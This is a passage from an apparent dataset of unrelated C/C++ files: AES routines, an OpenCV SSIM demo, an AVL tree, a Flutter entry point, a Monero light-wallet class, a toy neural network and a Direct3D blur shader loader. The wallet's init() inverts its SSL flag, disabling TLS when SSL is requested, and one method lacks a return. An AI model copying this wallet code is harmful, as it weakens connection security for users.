0xf3, 0xd7, 0xfb,\n  0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,\n  0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,\n  0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,\n  0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,\n  0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,\n  0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,\n  0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,\n  0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,\n  0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,\n  0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,\n  0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,\n  0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,\n  0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,\n  0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,\n  0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d };\n\nvoid SubBytes(vector<vector<uint8_t>>& subst){ \nfor (int i = 0; i < 4; ++i){\n    for(int j = 0; j < 4; ++j){\n        subst[i][j] = sbox[subst[i][j]];\n    }\n    }\n }\n\n\nvoid invSubBytes(vector<vector<uint8_t>>& subst){ \nfor (int i = 0; i < 4; ++i){\n    for(int j = 0; j < 4; ++j){\n        subst[i][j] = inversesbox[subst[i][j]];\n    }\n    } \n }\nvoid ShiftRows(vector<vector<uint8_t>>& newst) { //vector of vectors provides matrix\n    //second row, one left shift\n    vector<vector<uint8_t>> temp = newst;\n    newst[0][1] = temp[1][1];\n    newst[1][1] = temp[2][1];\n    newst[2][1] = temp[3][1];\n    newst[3][1] = temp[0][1];\n    //third row, two shift\n    newst[0][2] = temp[2][2];\n    newst[1][2] = temp[3][2];\n    newst[2][2] = temp[0][2];\n    newst[3][2] = temp[1][2];\n    //fourth row, three shift\n    newst[0][3] = temp[3][3];\n    newst[1][3] = temp[0][3];\n    newst[2][3] = temp[1][3];\n    newst[3][3] = temp[2][3];\n}\n\n\nvoid invShiftRows(vector<vector<uint8_t>>& newst) { //vector of vectors provides matrix\n    //second row, one right shift\n    vector<vector<uint8_t>> temp = newst;\n    newst[1][0] = temp[1][3];\n    newst[1][1] = temp[1][0];\n    newst[1][2] = temp[1][1];\n    newst[1][3] = temp[1][2];\n    //third row, two shift\n    newst[2][0] = temp[2][2];\n    newst[2][1] = temp[2][3];\n    newst[2][2] ",
    "#include <opencv2/opencv.hpp>\r\n\r\nusing namespace cv;\r\n\r\n  // Function to changeIntensity (y = 255*(x/255)^alpha)\r\n  uchar neg(uchar pixel) {\r\n    return 255 - pixel;\r\n  }\r\n\r\nint main() {\r\n  // Read the grayscale image\r\n  Mat img = imread(\"lennagrey.bmp\", 0);\r\n\r\n  // Check if image is loaded successfully\r\n  if (!img.data) {\r\n    std::cout << \"Error: Could not open image!\" << std::endl;\r\n    return -1;\r\n  }\r\n\r\n  cv::Mat differentIntensity(img.rows, img.cols, CV_8UC1, cv::Scalar(0));\r\n\r\n  // Apply transformation to each pixel\r\n  for (int i = 0; i < img.rows; i++) {\r\n    for (int j = 0; j < img.cols; j++) {\r\n      differentIntensity.at<uchar>(i, j) = neg(img.at<uchar>(i, j));\r\n    }\r\n  }\r\n\r\n  double M = img.rows;\r\n  double N = img.cols;\r\n  double reciprocal_MN = 1 / (M * N);\r\n  double uX = 0;\r\n  double uY = 0;\r\n\r\n  for (int i = 0; i < M; i++) {\r\n    for (int j = 0; j < N; j++) {\r\n      uX += img.at<uchar>(i, j);\r\n      uY += differentIntensity.at<uchar>(i, j);\r\n    }\r\n  }\r\n  uX *= reciprocal_MN;\r\n  uY *= reciprocal_MN;\r\n\r\n  double varX = 0;\r\n  double coVarXy = 0;\r\n  double varY = 0;\r\n  for (int i = 0; i < M; i++) {\r\n    for (int j = 0; j < N; j++) {\r\n      double diffMeanX = img.at<uchar>(i, j) - uX;\r\n      varX += pow(diffMeanX, 2);\r\n      double diffMeanY = differentIntensity.at<uchar>(i, j)  - uY;\r\n      varY += pow(diffMeanY, 2);\r\n      coVarXy += diffMeanX * diffMeanY;\r\n    }\r\n  }\r\n  varX *= reciprocal_MN;\r\n  coVarXy *= reciprocal_MN;\r\n  varY *= reciprocal_MN;\r\n  \r\n  double L = 255;\r\n  double c1 = sqrt(1/L);\r\n  double c2 = sqrt(1/L);\r\n  double c1Lsquare = pow(c1 * L,2);\r\n  double c2Lsquare = pow(c2 * L,2);\r\n  double SSIM = (2 * uX * uY + c1Lsquare) * (2 * coVarXy + c2Lsquare) / ((pow(uX , 2) + pow(uY , 2) + c1Lsquare) * (varX + varY + c2Lsquare));\r\n\r\n  printf(\"SSIM = %lf \\n\\n\", SSIM);\r\n  /*\r\n  double NRMSE = sqrt( sum_square_error /  Sxx );\r\n  double PSNR = 10 * log10( pow(xMax, 2)* M * N / sum_square_error );\r\n\r\nprintf(\"sum_square_error = %lf \\n\\n\", sum_square_error);\r\nprintf(\"Sxx = %lf \\n\\n\", Sxx);\r\nprintf(\"rows = %d \\n\", M);\r\nprintf(\"NRMSE = %lf \\n\\n\", NRMSE);\r\nprintf(\"PSNR = %lf \\n\\n\", PSNR);\r\n*/\r\n    // Display the image change intensity\r\n  cv::imshow(\"differentIntensity\", differentIntensity);\r\n\r\n  cv::imshow(\"Origin\", img);\r\n\r\n    //cv::Mat imgOrigin = img;\r\n    //cv::imshow(\"Origin\", imgOrigin); \r\n    cv::waitKey(0); \r\n    cv::destroyAllWindows(); \r\n\r\n  return 0;\r\n}",
    "#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n\r\nstruct node{\r\n    int key;\r\n    char name[31];\r\n    int bf;\r\n    int height;\r\n    node* left;\r\n    node* right;\r\n};\r\n\r\nnode* createnode(int key, char name[]){\r\n    node* newnode = (node*)malloc(sizeof(node));\r\n    newnode->key = key;\r\n    strcpy(newnode->name, name);\r\n    newnode->bf = 0;\r\n    newnode->height = 1;\r\n    newnode->left = newnode->right = NULL;\r\n    return newnode;\r\n}\r\n\r\nint getmax(int a, int b){\r\n    return a > b ? a:b;\r\n}\r\n\r\nint getheight(node* nodes){\r\n    if(!nodes)return NULL;\r\n    return nodes->height;\r\n}\r\n\r\nint setheight(node* nodes){\r\n    if(!nodes)return NULL;\r\n    return getmax(getheight(nodes->left), getheight(nodes->right)) + 1;\r\n}\r\n\r\nint setbf(node* nodes){\r\n    if(!nodes)return NULL;\r\n    return getheight(nodes->left) - getheight(nodes->right);\r\n}\r\n\r\nnode* updatenode(node* nodes){\r\n    if(nodes==NULL)return NULL;\r\n    nodes->bf = setbf(nodes);\r\n    nodes->height = setheight(nodes);\r\n    return nodes;\r\n}\r\n\r\nnode* leftrotate(node* nodes){\r\n    node* pivot = nodes->right;\r\n    node* leftchild = pivot->left;\r\n    //perform rotate\r\n    pivot->left = nodes;\r\n    nodes->right = leftchild;\r\n\r\n    nodes = updatenode(nodes);\r\n    pivot = updatenode(pivot);\r\n    return pivot;\r\n}\r\n\r\nnode* rightrotate(node* nodes){\r\n    node* pivot = nodes->left;\r\n    node* rightchild = pivot->right;\r\n    //perform rotate\r\n    pivot->right = nodes;\r\n    nodes->left = rightchild;\r\n\r\n    nodes = updatenode(nodes);\r\n    pivot = updatenode(pivot);\r\n    return pivot;\r\n}\r\n\r\nnode* rotate(node* nodes){\r\n    if(!nodes)return nodes;\r\n    //klw left heavy\r\n    else if(nodes->bf > 1){\r\n        if(nodes->left->bf >= 0){\r\n            return rightrotate(nodes);\r\n        }\r\n        else if(nodes->left->bf < 0){\r\n            nodes->left = leftrotate(nodes->left);\r\n            return rightrotate(nodes);\r\n        }\r\n    }//klw right heavy\r\n    else if(nodes->bf < -1){\r\n        //right right\r\n        if(nodes->right->bf <= 0){\r\n            return leftrotate(nodes);\r\n        }\r\n        else if(nodes->right->bf > 0){\r\n            nodes->right = rightrotate(nodes->right);\r\n            return leftrotate(nodes);\r\n        }\r\n    }\r\n    return nodes;\r\n}\r\n\r\nnode* insertnode(node* nodes, node* newnode){\r\n    if(!nodes) return newnode;\r\n    else if(newnode->key < nodes->key){\r\n        nodes->left = insertnode(nodes->left, newnode);\r\n    }\r\n    else if( newnode->key > nodes->key){\r\n        nodes->right = insertnode(nodes->right, newnode);\r\n    }\r\n    else if(newnode->key == nodes->key){\r\n        printf(\"Node Duplicated\\n\");\r\n        return nodes;\r\n    }\r\n    return rotate(updatenode(nodes));\r\n}\r\n\r\nnode* deletenode(node* nodes, char name[]){\r\n    if(!nodes)return nodes;\r\n    else if(strcmp(nodes->name, name) > 0){\r\n        nodes->left = deletenode(nodes->left, name);\r\n    }\r\n    else if(strcmp(nodes->name, name) < 0){\r\n        nodes->right = deletenode(nodes->right, name);\r\n    }\r\n    else{\r\n        if(!nodes->right && !nodes->left){\r\n            free(nodes);\r\n            nodes = NULL;\r\n        }\r\n        else if(!nodes->right){\r\n            node* temp = nodes->left;\r\n            free(nodes);\r\n            return temp;\r\n        }\r\n        else if(!nodes->left){\r\n            node* temp = nodes->right;\r\n            free(nodes);\r\n            return temp;\r\n        }\r\n        else{\r\n            node* prede = nodes->left;\r\n            while(prede->right){\r\n                prede = prede->right;\r\n            }\r\n            strcpy(nodes->name, prede->name);\r\n            nodes->key = prede->key;\r\n            nodes->left = deletenode(nodes->left, prede->name);\r\n        }\r\n    }\r\n    if(nodes == NULL)return NULL;\r\n    return rotate(updatenode(nodes));\r\n}\r\n\r\nnode* searchnode(node* nodes, int key){\r\n    if(!nodes)return nodes;\r\n    else if(key < nodes->key){\r\n        return searchnode(nodes->left, key);\r\n    }\r\n    else if(key > nodes->key){\r\n        return searchnode(nodes->right, key);\r\n    }\r\n    else{\r\n        return nodes;\r\n    }\r\n}\r\n\r\nvoid printinorder(node* nodes){\r\n    if(nodes){\r\n        printinorder(nodes->left);\r\n        printf(\"ID: %d, Name: %s, BF: %d, Height: %d\\n\", nodes->key, nodes->name, nodes->bf, nodes->height);\r\n        printinorder(nodes->right);\r\n    }\r\n}\r\n\r\nint main(){\r\n    struct node* root = NULL;\r\n    int key, amount, searchkey;\r\n    char name[31], deletename[31];\r\n\r\n    printf(\"How many students ? \"); scanf(\"%d\", &amount);\r\n    for(int i = 0; i < amount; i++){\r\n        printf(\"What is the name of student ? \"); scanf(\"%s\", name);\r\n        printf(\"What is the ID of student ? \"); scanf(\"%d\", &key);\r\n        root = insertnode(root, createnode(key, name));\r\n    }\r\n    printinorder(root);\r\n    printf(\"\\n\");\r\n    printf(\"Who do you want to delete? \");scanf(\"%s\", deletename);\r\n    root = deletenode(root, deletename);\r\n    printinorder(root);\r\n\r\n    printf(\"Who do you want to Search? \");scanf(\"%d\", &searchkey);\r\n    node* result = searchnode(root, searchkey);\r\n    if(result){",
    "/*\n3) User Defined Types\nStructures : struct\nClasses : class\nUnions : union\n*/\n#include<iostream>\nusing namespace std;\n\n//Structuter - A collection of variables of different types under a single name\nstruct Point\n{\n    int x;\n    int y;\n};\n\n//Class - A blueprint for objects; it can contain variables and functions\nclass Info\n{\n    public:\n        string name;\n        int age;\n};\n\n// Union - A special data type that allows storing different data types in the same memory location\nunion Value \n{\n    int intValue;\n    float floatValue;\n};\n\nint main(){\n    //Structures - cannot contain methods only contain members\n    cout<<\"Structure\"<<endl;\n    Point p1={3,6};\n    cout<<\"struct p1.x : \"<<p1.x<<endl;\n    cout<<\"struct p1.y : \"<<p1.y<<endl;\n    cout<<endl;\n\n    //Classes \n    cout<<\"Class\"<<endl;\n    Info stud;\n    stud.name = \"Utkarsh\";\n    stud.age = 21;\n    cout<<\"class stud.name : \"<<stud.name<<endl;\n    cout<<\"class stud.age : \"<<stud.age<<endl;\n    cout<<endl;\n\n    //Union \n    cout<<\"Union\"<<endl;\n    Value val;\n    val.intValue = 36;\n    //val.floatValue = 3.6;\n    cout<<\"union val.intValue : \"<<val.intValue<<endl;\n    //cout<<\"union val.floatValue :  \"<<val.floatValue<<endl;\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"caculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (c) 2014-2024, The Monero Project\n// \n// All rights reserved.\n// \n// Redistribution and use in source and binary forms, with or without modification, are\n// permitted provided that the following conditions are met:\n// \n// 1. Redistributions of source code must retain the above copyright notice, this list of\n//    conditions and the following disclaimer.\n// \n// 2. Redistributions in binary form must reproduce the above copyright notice, this list\n//    of conditions and the following disclaimer in the documentation and/or other\n//    materials provided with the distribution.\n// \n// 3. Neither the name of the copyright holder nor the names of its contributors may be\n//    used to endorse or promote products derived from this software without specific\n//    prior written permission.\n// \n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\n// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n// MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL\n// THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\n// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF\n// THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"wallet.h\"\n\n#include <fstream>\n#include \"backend.h\"\n#include \"hex.h\"       // monero/contrib/epee/include\n#include \"lwsf_config.h\"\n#include \"net/parse.h\"         // monero/src\n#include \"net/socks_connect.h\" // monero/src\n#include \"transaction_history.h\"\n\nnamespace lwsf { namespace internal\n{\n  namespace\n  {\n    struct null_connector\n    {\n      boost::unique_future<boost::asio::ip::tcp::socket>\n        operator()(const std::string&, const std::string&, boost::asio::steady_timer&) const\n      {\n        throw std::runtime_error{\"Unable to connect\"};\n      }\n    };\n  }\n\n  wallet::wallet(std::string filename, std::shared_ptr<backend::wallet> data)\n    : data_(std::move(data)), filename_(std::move(filename)), thread_()\n  {\n    if (!data_)\n      throw std::logic_error{\"Unepected nullptr in internal::wallet\"};\n  }\n\n  wallet::~wallet()\n  {}\n\n  void wallet::statusWithErrorString(int& status, std::string& errorString) const\n  {\n    const boost::unique_lock<boost::mutex> lock{data_->sync};\n    status = data_->status.value();\n    if (status)\n      errorString = data_->status.message();\n    else\n      errorString.clear();\n  }\n\n  NetworkType wallet::nettype() const { data_->primary.type; }\n\n  std::string wallet::secretViewKey() const\n  {\n    return epee::to_hex::string(epee::as_byte_span(unwrap(unwrap(data_->primary.view.sec))));\n  }\n\n  std::string wallet::publicViewKey() const\n  {\n    return epee::to_hex::string(epee::as_byte_span(data_->primary.view.pub));\n  }\n\n  std::string wallet::secretSpendKey() const\n  {\n    return epee::to_hex::string(epee::as_byte_span(unwrap(unwrap(data_->primary.spend.sec))));\n  }\n\n  std::string wallet::publicSpendKey() const\n  {\n    return epee::to_hex::string(epee::as_byte_span(data_->primary.spend.pub));\n  }\n\n  bool wallet::store(const std::string& path)\n  {\n    expect<epee::byte_slice> bytes = data_->to_bytes();\n    if (!bytes)\n      return false;\n\n    //! \\TODO Write, fsync, then atomic swap filenames\n\n    std::ofstream file{path, std::ios::out | std::ios::binary};\n    file.write(reinterpret_cast<const char*>(bytes->data()), bytes->size());\n    file.flush();\n    return file.good();\n  }\n\n  bool wallet::init(const std::string &daemon_address, uint64_t, const std::string &daemon_username, const std::string &daemon_password, bool use_ssl, bool light_wallet, const std::string &proxy_address)\n  {\n    if (!light_wallet)\n      throw std::runtime_error{\"Only light_wallets are supported with this instance\"};\n\n    const auto split = daemon_address.rfind(':');\n    if (!setProxy(proxy_address))\n      return false; // set_status already set\n\n    std::string host = daemon_address.substr(0, split);\n    std::string port = use_ssl ? \"443\" : \"80\";\n    if (split != std::string::npos)\n      port = daemon_address.substr(split + 1);\n\n    epee::net_utils::http::login login{daemon_username, daemon_password};\n    const epee::net_utils::ssl_options_t options{\n      use_ssl ? epee::net_utils::ssl_support_t::e_ssl_support_disabled : epee::net_utils::ssl_support_t::e_ssl_support_enabled\n    };\n\n    data_->client.set_server(std::move(host), std::move(port), std::move(login), std::move(options));\n\n    //! \\TODO Login!\n    return true;\n  }\n\n\n  uint64_t wallet::getRefreshFromBlockHeight() const\n  {\n    const boost::lock_guard<boost::mutex> lock{data_->sync};\n    return data_->primary.restore_height;\n  }\n\n  bool wallet::connectToDaemon()\n  {\n    if (dat",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <fstream> // For file operations\n#include <random>\n\nconstexpr int layer_one_units = 10;\nconstexpr int layer_two_units = 10;\n\n// ReLU activation function: Returns max(0, x) where x is the input value.\ndouble relu(const double &x) { return x > 0 ? x : 0; }\n\n// Derivative of ReLU: Returns 1 if input > 0, else 0.\ndouble relu_derivative(const double &x) { return x > 0 ? 1 : 0; }\n\n// Linear activation function: Returns the input value (identity function).\ndouble linear(const double &x) { return x; }\n\n// Derivative of Linear activation function: Always returns 1.0.\nconstexpr double linear_derivative(const double &x) { return 1.0; }\n\n// Dense Layer Class template for a fully connected layer\ntemplate <int InputSize, int OutputSize>\nclass Dense_Layer\n{\npublic:\n    std::vector<double> inputs;               // Input values to the layer\n    std::vector<double> outputs;              // Output values from the layer\n    std::vector<std::vector<double>> weights; // Weight matrix\n    std::vector<double> biases;               // Bias vector\n    bool use_relu;                            // Flag to use ReLU activation\n\n    // Constructor initializes layer with optional ReLU activation\n    explicit Dense_Layer(const bool relu = true) : use_relu(relu)\n    {\n        outputs.resize(OutputSize);\n        weights.resize(InputSize, std::vector<double>(OutputSize));\n        biases.resize(OutputSize);\n        init_weights_biases();\n    }\n\n    // Initialize weights and biases with random values\n    void init_weights_biases()\n    {\n        // Create a random device and Mersenne Twister random number generator\n        std::random_device rd;\n        std::mt19937 gen(rd());\n\n        // Define a distribution in the range [-1, 1]\n        std::uniform_real_distribution<> dis(-1.0, 1.0);\n\n        // Initialize weights with random values in the range [-1, 1]\n        for (int i = 0; i < InputSize; ++i)\n            for (int j = 0; j < OutputSize; ++j)\n                weights[i][j] = dis(gen);\n\n        // Initialize biases with random values in the range [-1, 1]\n        for (int j = 0; j < OutputSize; ++j)\n            biases[j] = dis(gen);\n    }\n\n    // Forward pass through the layer --> A(\u2211x.w + b)\n    void forward(const std::vector<double> &input)\n    {\n        inputs = input;\n        for (int j = 0; j < OutputSize; ++j)\n        {\n            outputs[j] = biases[j];\n            for (int i = 0; i < InputSize; ++i)\n            {\n                outputs[j] += inputs[i] * weights[i][j];\n            }\n            // Apply activation function (ReLU or linear)\n            outputs[j] = use_relu ? relu(outputs[j]) : linear(outputs[j]);\n        }\n    }\n\n    // Backward pass through the layer to update weights and biases\n    void backward(const std::vector<double> &errors, std::vector<double> &input_errors, double learning_rate)\n    {\n        std::vector<double> gradients(OutputSize);\n        // Compute gradients based on activation function's derivative\n        for (int j = 0; j < OutputSize; ++j)\n        {\n            gradients[j] = errors[j] * (use_relu ? relu_derivative(outputs[j]) : linear_derivative(outputs[j]));\n        }\n\n        // Update weights and compute input errors\n        for (int i = 0; i < InputSize; ++i)\n        {\n            input_errors[i] = 0.0;\n            for (int j = 0; j < OutputSize; ++j)\n            {\n                input_errors[i] += gradients[j] * weights[i][j];\n                weights[i][j] += learning_rate * gradients[j] * inputs[i];\n            }\n        }\n\n        // Update biases\n        for (int j = 0; j < OutputSize; ++j)\n        {\n            biases[j] += learning_rate * gradients[j];\n        }\n    }\n};\n\n// Model Class manages the network structure and training\nclass Model\n{\npublic:\n    Dense_Layer<1, layer_one_units> layer1;               // First hidden layer\n    Dense_Layer<layer_one_units, layer_two_units> layer2; // Second hidden layer\n    Dense_Layer<layer_two_units, 1> output_layer;         // Output layer\n\n    // Constructor initializes layers\n    Model() : layer1(true), layer2(true), output_layer(false) {} // ReLU for hidden layers, linear for output layer\n\n    // Forward pass through the network\n    void forward(const std::vector<double> &input)\n    {\n        layer1.forward(input);\n        layer2.forward(layer1.outputs);\n        output_layer.forward(layer2.outputs);\n    }\n\n    // Backward pass to update weights and biases\n    void backward(const std::vector<double> &target, double learning_rate)\n    {\n        std::vector<double> output_errors(1);\n        output_errors[0] = target[0] - output_layer.outputs[0];\n\n        std::vector<double> layer2_errors(layer_two_units);\n        output_layer.backward(output_errors, layer2_errors, learning_rate);\n\n        std::vector<double> layer1_errors(layer_one_units);\n        layer2.backward(layer2_errors, layer1_errors, learning_rate);\n\n        std::vector<double> input_errors(1);\n        layer1.backward(layer1_",
    "#include \"CBlurProcessor.h\"\n#include \"../../third-party/imgui/impl/imgui_impl_dx9.h\"\n#include \"../../../protect/crypt_str.h\"\n#include \"../../../render.h\"\n#include <array>\n#include <wrl/client.h>\n\nusing Microsoft::WRL::ComPtr;\ntemplate <unsigned int N>\nconstexpr auto DecodeBase85(const char(&input)[N]) noexcept\n{\n    std::array<char, N * 4 / 5> out{};\n\n    constexpr auto decode85Byte = [](char c) constexpr -> unsigned int { return c >= '\\\\' ? c - 36 : c - 35; };\n\n    for (unsigned int i = 0, j = 0; i < N - 1; i += 5, j += 4) {\n        unsigned int tmp = decode85Byte(input[i]) + 85 * (decode85Byte(input[i + 1]) + 85 * (decode85Byte(input[i + 2]) + 85 * (decode85Byte(input[i + 3]) + 85 * decode85Byte(input[i + 4]))));\n        out[j] = ((tmp >> 0) & 0xFF); out[j + 1] = ((tmp >> 8) & 0xFF); out[j + 2] = ((tmp >> 16) & 0xFF); out[j + 3] = ((tmp >> 24) & 0xFF);\n    }\n\n    return out;\n}\n\n// File: 'blur_x' (600 bytes)\n// Exported using binary_to_compressed_c.cpp\nconstexpr auto blur_x = DecodeBase85(\n    \"%/P:vP>$(#>T$<8?####Q$###%/P:v%####?####OS'##J$###h####&####$####t#########.$###%####$####:$########tn=j=$8HlEQ2TuY3l:$#%),##$#########0g'WC\"\n    \"`-.:CVjSuY&5>##%),##$#########C,.33UnSc;'AViF6JrEH<Sk:0+bVe=K&&PDlf1eGdfX1F$*fUCs'el1K>,C5AH3I3b48(#$QUV$)%XHVd;#K7#####X/'.7`7r'7$QUV$*%XHV\"\n    \"d:i[7bmhf6##########D5YY#NSi.L,nHS[D5YY#_9r:Q0=XHVi>uu#^XF0LdfIl[[BA`V&5YY#W.]/Lpu$GV+>uu#PYr.LOV%JLou$GV&5YY#Q`%/Lpv*PV(>uu#Sf./L5hJcLdfIl[\"\n    \"(>uu#Rf./L4_/GLdfIl[&5YY#Y.]/Lqu$GV+>uu#RYr.LQV%JLou$GV&5YY#S`%/Lpv*PV(>uu#Uf./L7hJcLdfIl[(>uu#Tf./L6_/GLdfIl[i>uu#_XF0L4_/GL[BA`Vi>uu#`XF0L\"\n    \"5_/GL[BA`Vi>uu#aXF0L6_/GL[BA`Vi>uu#bXF0L7_/GL[BA`V+>uu#W(S/L5_/GLpw0YV+G:;$W(S/L3_/GLpx6cV5_/GL+G:;$V(S/L4_/GLpw0YV5_/GL+G:;$V(S/L7_/GLqv*PV\"\n    \"4_/GL+G:;$U(S/L6_/GLqv*PV4_/GL&5YY#fqF0L3_/GL#),##\");\n\nconstexpr auto blur_y = DecodeBase85(\n    \"%/P:vP>$(#>T$<8?####Q$###%/P:v%####?####OS'##J$###h####&####$####t#########.$###%####$####:$########tn=j=$8HlEQ2TuY3l:$#%),##$#########0g'WC\"\n    \"Qk;nDhpF/#&5>##%),##$#########C,.33UnSc;'AViF6JrEH<Sk:0+bVe=K&&PDlf1eGdfX1F$*fUCs'el1K>,C5AH3I3b48(#$QUV$)%XHV9miVaX/'.7`7r'7d;#K7$QUV$*%XHV\"\n    \"9lXhabmhf6d:i[7#####D5YY#NSi.L,nHS[D5YY#_9r:Q0=XHVi>uu#^XF0LdfIl[[BA`V&5YY#PYr.L)[-S[&5YY#Y4f/LT*A`V+G:;$Q`%/Lou$GVPV%JL)]3][&5YY#RYr.L)[-S[\"\n    \"+G:;$S`%/Lou$GVPSi.L)]3][&5YY#QYr.L)[-S[&5YY#Wr@/LU*A`V+G:;$R`%/Lou$GVRSi.L)]3][&5YY#SYr.L)[-S[+G:;$T`%/Lou$GVRUu@L)]3][i>uu#_XF0L4_/GL[BA`V\"\n    \"i>uu#aXF0L6_/GL[BA`Vi>uu#`XF0L5_/GL[BA`Vi>uu#bXF0L7_/GL[BA`V+>uu#X(S/L6_/GLpv*PV+G:;$X(S/L3_/GLpw0YV6_/GL+G:;$V(S/L4_/GLpv*PV6_/GL+G:;$V(S/L\"\n    \"5_/GLqv*PV4_/GL+G:;$U(S/L7_/GLqv*PV4_/GL&5YY#fqF0L3_/GL#),##\");\n\n\nvoid CBlurProcessor::BeginBlur(IDirect3DDevice9* pDevice)\n{\n    // initialize horizontal shader\n    if (pBlurShaderX == nullptr)\n    {\n        pDevice->CreatePixelShader(reinterpret_cast<const DWORD*>(blur_x.data()), &pBlurShaderX);\n    }\n\n    // initialize vertical shader\n    if (pBlurShaderY == nullptr)\n    {\n        pDevice->CreatePixelShader(reinterpret_cast<const DWORD*>(blur_y.data()), &pBlurShaderY);\n    }\n\n    // get backbuffer\n    IDirect3DSurface9* pBackBuffer = nullptr;\n    pDevice->GetBackBuffer(0, 0, D3DBACKBUFFER_TYPE_MONO, &pBackBuffer);\n\n    D3DSURFACE_DESC backDesc = { };\n    pBackBuffer->GetDesc(&backDesc);\n\n    // reset textures\n    if (uBackBufferWidth != backDesc.Width || uBackBufferHeight != backDesc.Height)\n    {\n        if (pBlurFirst != nullptr)\n        {\n            pBlurFirst->Release();\n            pBlurFirst = nullptr;\n        }\n\n        if (pBlurSecond != nullptr)\n        {\n            pBlurSecond->Release();\n            pBlurSecond = nullptr;\n        }\n\n        uBackBufferWidth = backDesc.Width;\n        uBackBufferHeight = backDesc.Height;\n    }\n\n    // initialize textures\n    if (pBlurFirst == nullptr)\n        pDevice->CreateTexture(uBackBufferWidth / nBlurDownsample, uBackBufferHeight / nBlurDownsample, 1, D3DUSAGE_RENDERTARGET, D3DFMT_X8R8G8B8, D3DPOOL_DEFAULT, &pBlurFirst, nullptr);\n\n    if (pBlurSecond == nullptr)\n        pDevice->CreateTexture(uBackBufferWidth / nBlurDownsample, uBackBufferHeight / nBlurDownsample, 1, D3DUSAGE_RENDERTARGET, D3DFMT_X8R8G8B8, D3DPOOL_DEFAULT, &pBlurSecond, nullptr);\n\n    pDevice->GetRenderTarget(0UL, &pSurfaceBackup);\n\n    IDirect3DSurface9* 